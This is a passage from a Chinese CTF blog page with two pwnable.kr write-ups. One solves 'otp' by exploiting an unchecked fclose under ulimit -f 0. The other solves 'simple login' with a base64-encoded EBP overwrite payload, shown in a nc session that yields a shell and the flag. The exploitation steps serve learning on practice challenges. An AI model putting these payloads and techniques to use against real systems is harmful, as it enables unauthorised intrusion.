<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="zh-CN">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '6.3.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  





  <script>
  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
  daovoice('init', {
      app_id: "7b5da8eb"
    });
  daovoice('update');
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="R00tnb&#39;s Blog">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="R00tnb&#39;s Blog">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="R00tnb&#39;s Blog">






  <link rel="canonical" href="http://yoursite.com/page/2/"/>



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>R00tnb's Blog</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>
    <a href="https://github.com/r00tnb/"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">R00tnb's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
    <a href="/categories/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/26/pwnable.kr-otp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/26/pwnable.kr-otp/" itemprop="url">
                  pwnable.kr-otp
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-02-26 10:56:31" itemprop="dateCreated datePublished" datetime="2018-02-26T10:56:31+08:00">2018-02-26</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/02/26/pwnable.kr-otp/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/02/26/pwnable.kr-otp/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/02/26/pwnable.kr-otp/" class="leancloud_visitors" data-flag-title="pwnable.kr-otp">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开始一直在找溢出点哈哈，最后实在没有头绪看了别人的<a href="http://blog.csdn.net/z231288/article/details/65512472" target="_blank" rel="noopener">writeup</a></p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>先分析源码<code>otp.c</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> fname[<span class="number">128</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> otp[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"usage : ./otp [passcode]\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span>(fd==<span class="number">-1</span>) <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(read(fd, otp, <span class="number">16</span>)!=<span class="number">16</span>) <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sprintf</span>(fname, <span class="string">"/tmp/%llu"</span>, otp[<span class="number">0</span>]);</span><br><span class="line">	FILE* fp = fopen(fname, <span class="string">"w"</span>);</span><br><span class="line">	<span class="keyword">if</span>(fp==<span class="literal">NULL</span>)&#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;</span><br><span class="line">	fwrite(&amp;otp[<span class="number">1</span>], <span class="number">8</span>, <span class="number">1</span>, fp);</span><br><span class="line">	fclose(fp);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"OTP generated.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> passcode=<span class="number">0</span>;</span><br><span class="line">	FILE* fp2 = fopen(fname, <span class="string">"r"</span>);</span><br><span class="line">	<span class="keyword">if</span>(fp2==<span class="literal">NULL</span>)&#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;</span><br><span class="line">	fread(&amp;passcode, <span class="number">8</span>, <span class="number">1</span>, fp2);</span><br><span class="line">	fclose(fp2);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(strtoul(argv[<span class="number">1</span>], <span class="number">0</span>, <span class="number">16</span>) == passcode)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"OTP mismatch\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	unlink(fname);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序从<code>/dev/urandow</code>伪随机设备里读出16个字节，前8个字节用作文件名后8字节存在该文件里，最后会从文件中读出8字节与传入的参数做比较，相等就能getflag。<br>开始找溢出点半天也没找到，题目也说了不能爆破所以是一点头绪也没有。后来看了别人的writeup后真是郁闷，原来题目平台还能使用<code>ulimit</code>命令，该命令的介绍百度就有很多。这里使用<code>ulimit -f 0</code>来限制进程创建文件的大小为0,这样程序在执行<code>fclose</code>的时候缓冲区的内容就无法写入文件，那么最后读出来的就是0了。<br>于是exp就出来了，直接在题目平台上搞<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">otp@ubuntu:~$ <span class="built_in">ulimit</span> -f 0</span><br><span class="line">otp@ubuntu:~$ python</span><br><span class="line">Python 2.7.12 (default, Jul  1 2016, 15:12:24) </span><br><span class="line">[GCC 5.4.0 20160609] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.system(<span class="string">'ls'</span>)</span><br><span class="line">flag  otp  otp.c</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; os.system(<span class="string">'./otp 0'</span>)</span><br><span class="line">OTP generated.</span><br><span class="line">Congratz!</span><br><span class="line">Darn... I always forget to check the <span class="built_in">return</span> value of fclose() :(</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p>
<p>要注意的是，不能直接在shell里搞，因为这样shell直接会返回异常。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题目的漏洞有内因和外因，内因就像flag中说的没有对<code>fclose</code>的返回值检查，导致可能写入文件失败。外因就是<code>ulimit</code>命令了，没有限制普通用户对它的使用。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/25/pwnable.kr-simple login/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/25/pwnable.kr-simple login/" itemprop="url">
                  pwnable.kr-simple login
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-02-25 22:24:00" itemprop="dateCreated datePublished" datetime="2018-02-25T22:24:00+08:00">2018-02-25</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/02/25/pwnable.kr-simple login/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/02/25/pwnable.kr-simple login/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/02/25/pwnable.kr-simple login/" class="leancloud_visitors" data-flag-title="pwnable.kr-simple login">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其实是一道很简单的栈溢出题目，但是我在分析代码的时候却浪费了不少时间，主要是没注意linux下<code>base64</code>命令在编码时会主动加上换行符<code>\n</code>的base64编码，导致逻辑分析错误，教训啊。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>还是得逆向<code>login</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v4; <span class="comment">// [sp+18h] [bp-28h]@1</span></span><br><span class="line">  __int16 v5; <span class="comment">// [sp+1Eh] [bp-22h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [sp+3Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;v5, <span class="number">0</span>, <span class="number">0x1E</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Authenticate : "</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%30s"</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;input, <span class="number">0</span>, <span class="number">0xC</span>u);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v6 = Base64Decode((<span class="keyword">int</span>)&amp;v5, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v6 &gt; <span class="number">0xC</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong Length"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;input, v4, v6);</span><br><span class="line">    <span class="keyword">if</span> ( auth(v6) == <span class="number">1</span> )</span><br><span class="line">      correct();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __<span class="function">cdecl <span class="title">auth</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [sp+14h] [bp-14h]@1</span></span><br><span class="line">  <span class="keyword">char</span> *s2; <span class="comment">// [sp+1Ch] [bp-Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+20h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;v4, &amp;input, a1);</span><br><span class="line">  s2 = (<span class="keyword">char</span> *)calc_md5((<span class="keyword">int</span>)&amp;v2, <span class="number">12</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hash : %s\n"</span>, s2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(<span class="string">"f87cd601aa7fedca99018a8be88eda34"</span>, s2) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">correct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( input == <span class="number">-559038737</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Congratulation! you are good!"</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>贴上主要函数的反编译代码。主要逻辑是通过<code>auth</code>函数的判断可以给你个shell。分析<code>auth</code>函数可以知道，正常途径需要md5值跟<code>f87cd601aa7fedca99018a8be88eda34</code>相等才能通过判断，但是这个md5值计算的是栈上的数据，这里没有办法控制，而且这个md5值网上也没有破解到明文，所以此路不通。<br>继续程序逻辑可以发现，输入的字符串会经过<code>Base64Decode</code>解码，这个函数和上一题<a href="http://www.ktstartblog.top/index.php/archives/146/" target="_blank" rel="noopener">md5 calculator</a>算法一样，也存在溢出，但是这里由于限制的输入字符串只有30字节，只能从变量<code>v4</code>溢出到<code>v5</code>，作用不大。接下来程序限制了解码后的明文长度只能小于或等于<code>0xc</code>，然后明文会被复制到数据段的<code>input</code>变量中，进入<code>auth</code>函数内部可以发现这个函数调用<code>memcpy(&amp;v4, &amp;input, a1);</code>，然而<code>v4</code>实际上只有8个字节大小。如果明文最大12个字节的话，那么存储<code>ebp</code>的栈空间就会被覆盖。再看看<code>main</code>函数最后有一个<code>leave</code>指令，这个指令相当于<code>mov esp，ebp;pop ebp</code>，而这个<code>ebp</code>就是前面可以控制的栈空间中的<code>ebp</code>。那么之后函数返回时就能控制返回地址。<br>整理下思路：</p>
<ol>
<li>明文最大长度12字节，最后4字节填入存储执行的地址的地址在减4字节（还有<code>pop ebp</code>操作）如<code>input</code>地址</li>
<li>明文前4字节填入要执行的地址，如<code>system(&#39;/bin/sh&#39;);</code>反汇编可以看到地址是<code>0x08049284</code></li>
</ol>
<p>exp如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.12 (default, Dec  4 2017, 14:50:18) </span><br><span class="line">[GCC 5.4.0 20160609] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; base64.b64encode(<span class="string">'\x84\x92\x04\x081234\x3c\xeb\x11\x08'</span>)</span><br><span class="line"><span class="string">'hJIECDEyMzQ86xEI'</span></span><br><span class="line">&gt;&gt;&gt; quit()</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@1:~/桌面/<span class="built_in">test</span>$ nc pwnable.kr 9003</span><br><span class="line">Authenticate : hJIECDEyMzQ86xEI</span><br><span class="line"><span class="built_in">hash</span> : 7e562c3d896c061642d4d64162cbf94e</span><br><span class="line">ls</span><br><span class="line">flag</span><br><span class="line"><span class="built_in">log</span></span><br><span class="line">simplelogin</span><br><span class="line">super.pl</span><br><span class="line">cat flag</span><br><span class="line">control EBP, control ESP, control EIP, control the world~</span><br></pre></td></tr></table></figure>
<p>另外需要注意的是<code>auth</code>函数是没有<code>stack canary</code>保护的，所以可以放心覆盖。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>难度不难，但是要注意细节。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/25/pwnable.kr-md5 calculator/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/25/pwnable.kr-md5 calculator/" itemprop="url">
                  pwnable.kr-md5 calculator
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-02-25 17:37:00" itemprop="dateCreated datePublished" datetime="2018-02-25T17:37:00+08:00">2018-02-25</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/02/25/pwnable.kr-md5 calculator/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/02/25/pwnable.kr-md5 calculator/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/02/25/pwnable.kr-md5 calculator/" class="leancloud_visitors" data-flag-title="pwnable.kr-md5 calculator">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
